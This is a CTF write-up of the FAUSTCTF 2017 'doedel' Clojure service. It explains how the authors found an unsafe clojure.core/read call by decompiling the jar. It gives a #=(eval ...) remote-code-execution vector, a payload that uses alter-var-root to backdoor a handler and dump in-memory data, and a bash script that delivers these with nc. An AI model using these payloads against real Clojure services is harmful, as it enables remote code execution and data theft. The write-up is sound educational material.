---
layout: post
title: FAUSTCTF2017 doedel writeup
---
Some time ago I participated in FAUSTCTF 2017 as a member of Bushwhackers team. During the CTF me and @inviz were responsible for the doedel service. Here is our solution.

## Intro

Doedel was a service running on ports 1666 and 1667. In the service folder only two
files were present - a readme and a jar. The abbreviated version of the readme is as follows:

```markdowm
## Data Format

All messages are encoded in Extensible Data Notation
(see https://github.com/edn-format/edn).
All requests are hashes containing at least a :request-type.
All responses are also hashes, containing at least a :response-type.

## Interfaces

On port 1666 the devices interface with the server
and on port 1667 status reports can be requested.

```

## Cursory analysis

Unzipping the jar gets us a number of .class, .xml and .clj(s) files, which can be quickle identified as being a Clojure project. Thus our main information sources for this task are the [official website](https://clojure.org) and [clojuredocs](https://clojuredocs.org/). Also, some members of our team quickly recall a clojure service that was present during the Volgactf 2015 finals ([writeup 1](https://github.com/VolgaCTF/volgactf-2015-finals-sequencer-service/blob/master/VULNS.md), [writeup 2]()).

The custom code can be found in doedel subdir, both the compiled classfiles and the clj sources. The main entrypoint is core.clj with the following code:

```clj
(ns doedel.core
  (:require [doedel.status :as status]
            [doedel.data :as data]
            [doedel.util :as util]
            [clojure.core.async :refer :all])
  (:gen-class))

(defn -main [& args]
  (go (data/data-handler 1666))
  (go (status/status-handler 1667))
  (loop []
    (Thread/sleep Long/MAX_VALUE)
    (recur)))
```

So indeed, we have two listeners (data/data-handler and status/status-handler) on ports 1666 and 1667 respectively.

## Handler code

Both the status-handler and the data-handler have a similar source code (status.clj and data.clj respectively):

```clj
(ns doedel.whatever
  (:use clojure.edn)
  (:require [doedel.util :as util])
  (:import [java.net InetAddress]))


(defn whatever-handler [port]
  (let [hostname (.getHostName (InetAddress/getLocalHost))]
    (letfn [(handler-fn [input-reader output-writer] ; here we define a function that takes  input and output writers as parameters
              (let [request (read input-reader)] 
                ; here goes the code that handles the request
              ))
    ]

(util/handler handler-fn port)))) ; we pass this function to util/handler
; util/handler is just an socket listener that accepts connections and spawns handler-fns for each of them.
```

As we can see, the input strings are read using [clojure.edn/read](https://clojuredocs.org/clojure.edn/read), a safe variant of the clojure source code parser. Well, really is is a [Extensible data notation](https://github.com/edn-format/edn) parser, which is relate to clojure code like JSON is related to javascript. Remember the old bugs where unknowing js developers would parse JSON using eval instead of JSON.parse, resulting in XSS or code exec? Well, clojure also has an unsafe alternative to clojure.edn/read, namely the [clojure.core/read](https://clojuredocs.org/clojure.core/read). The docs even conveniently contain an usable exploit for clojure.core/read:

```clj
(read-string "#=(clojure.java.shell/sh \"echo\" \"hi\")") ; {:exit 0, :out "hi\n", :err ""}
```

Alright, but we do not use clojure.core/read, right? Right?

## Decompiling and finding the vuln

While looking through the data.clj code we can notice that some parts of the code are missing:

```clj
(defn get-patterns [input output-writer]
  ;; TODO
  )

(defn data-transmission [input out-put]
  ;; TODO
  )
```

We also know that .clj files in the jar are not executed, but were included only as a reference. That means that we have to decompile the class files and look at them as well!

My first tool of choice for java decompilation is jd-core, but in this case it fails to decompile the code into readable java. In this cases I use [CFR](http://www.benf.org/other/cfr/) which is dramatically slower, but produces very high quality results. Decompiling the status-handler code (status$status_handler$handler_fn__6356.class), we get the following start:

```java
public final class status$status_handler$handler_fn__6356
extends AFunction {
    Object hostname;
    public static final Var const__0 = RT.var((String)"clojure.core", (String)"read"); // WTFOMG!?
    public static final Var const__1 = RT.var((String)"clojure.core", (String)"spit");
    public static final Keyword const__4 = RT.keyword((String)null, (String)"status");
    public static final AFn const__5 = (AFn)RT.map((Object[])new Object[]{RT.keyword((String)null, (String)"request-type"), RT.keyword((String)null, (String)"status")});
    public static final Var const__6 = RT.var((String)"clojure.core", (String)"str");
    public static final Keyword const__7 = RT.keyword((String)null, (String)"response-type");
    public static final Keyword const__8 = RT.keyword((String)null, (String)"clojure-version");
    public static final Var const__9 = RT.var((String)"clojure.core", (String)"clojure-version");
    public static final Keyword const__10 = RT.keyword((String)null, (String)"hostname");
    public static final Keyword const__11 = RT.keyword((String)null, (String)"banner");
    public static final AFn const__13 = (AFn)RT.map((Object[])new Object[]{RT.keyword((String)null, (String)"response-type"), RT.keyword((String)null, (String)"error")});
```

Bingo! The status-handler actually uses unsafe clojure.core/read, we found the hole. Btw, the data-handler was safe.

## Exploitation

The flags for this service are store in an in-memory hash, so in order to steal them we have to write and execure some clojure code that gets the values we need from memory. The vulnerability also can be leveraged to gain a classic RCE which we used to steal flags for other services (some of them stored the flags in filesystem with lax permissions). The latter is actually a much easier task, so we will do that first

### Gaining RCE

For some reason, the exploit fro the docs (lol!) didn't work for us. We threw together a quick testbed and after a couple of failed attempts came with the following vector:

```clj
#=(eval (. (java.lang.Runtime/getRuntime) exec (into-array ["bash" "-c" "the command goes here"]) ))
```

The #= part directs the clojure reader to use a macro from another table [read more](https://yobriefca.se/blog/2014/05/19/the-weird-and-wonderful-characters-of-clojure/). Detailed explaination of the inner workings of this thing is beyond the scope of this writeup, but #=(eval (CLOJURE CODE HERE) ) is the ultimate way to execute clojure code that worked for us.

The output of the exec is not shown, so a backconnect is needed.

### Reading flags from memory

This was the more tricky part. Lets look at the data handler:

```clj
(def ^:dynamic *users*)
; SNIP
(defn data-handler [port]
  (binding [*users* (atom {})] ; create a locally-scoped bind
    (letfn [(handler-fn [input-reader output-writer]
              (let [input (read input-reader)
                    {:keys [request-type]} input]
                (when request-type
                  (case request-type
                    :register-user (register-user input output-writer)
                    :get-patterns (get-patterns input output-writer)
                    :send-data (data-transmission input output-writer)
                    :get-best-pattern (fun-time input output-writer)
                    (.write output-writer (str {:response-type :error}))))))]
      (util/handler handler-fn port))))
```

The data that we need is stored inside the users atom, which is bound inside the data-handler. That means that only the code inside data-handler can have access to its value. We have code exec in the context of status-handler, which is out of scope. This means that there is no (legal) way to access the data we need.

Luckily enough there are some methods to overcome this limitation. One possible solution would be to call some java methods and find the place that stores this bound variables, but this requires a lot of research. We chose to redefine functions that are being called inside data-handler (we chose fun-time), and then call them using a separate connection.

The final vector looked as follows:

```clj
#=(
        eval  (
            ; alter-var-root is the way to redefine a symbol in a way that is visible for all threads.
            alter-var-root #'doedel.data/fun-time ; its first arg is the name of the symbol we want to redefine
                (fn [x]  ; the second arg is the func that, when called with the old symbol value as an arg
                 (fn [input output-writer]  ; will return the new definition of the symbol, 
                    ;in this case a function with the same signature as the one that we redefine
                    ; that outputs the secret data when called with our 'secret' username
                    (let [user-id (:user-id input)]
                       (if
                            (.equals user-id "supersecret per-command string")
                            (.write output-writer (str @doedel.data/*users*) )
                            ()
                        )
                    )
                    ; and then calls the original function
                    (x input output-writer)
                )
            )
        )
)
```

The exploit looked as follows:

```bash
#!/bin/bash -x
IP=$1

function update(){
    # poisons the func, need to be run once per team
    user=`dd if=/dev/urandom bs=512 count=1  2>/dev/null | md5sum | awk '{print $1}'`
    echo $user > $IP.txt
    echo '#=( eval ( alter-var-root #'"'"'doedel.data/fun-time ( fn [x] (fn [input output-writer] (let [user-id (:user-id input)] (if (.equals user-id "'$user'") (.write output-writer (str @doedel.data/*users*) ) () ) ) (x input output-writer) ) ) ) )' | nc $IP 1667
}

count=2
function expl(){
    count=$(($count -1 ))
    if [ $count -eq 0 ]; then
        echo "Fail"
        exit
    fi
    if [ -e $IP.txt ] ; then
        # if we have a stored username for the team, use it
        username=`cat $IP.txt`
    else
        # Otherwise, poison the team and use the new username
        update
        username=`cat $IP.txt`
    fi
    result=`echo '{:request-type :get-best-pattern, :user-id "'$username'" }' | nc $IP 1666`
    if echo $result | grep -oq FAUST_ ; then
        # If the backdoor worked, sweet
        echo $result
    else
        # if not, this might mean that the team restarted the service, repeat the poisoning
        update
        expl
    fi
}

expl

```

## Patch

The status endpoint simply outputs a constant banner, so we reimplemented is using some python, and the used some iptables rules to redirect traffic from port 1667 to our safe implementation.
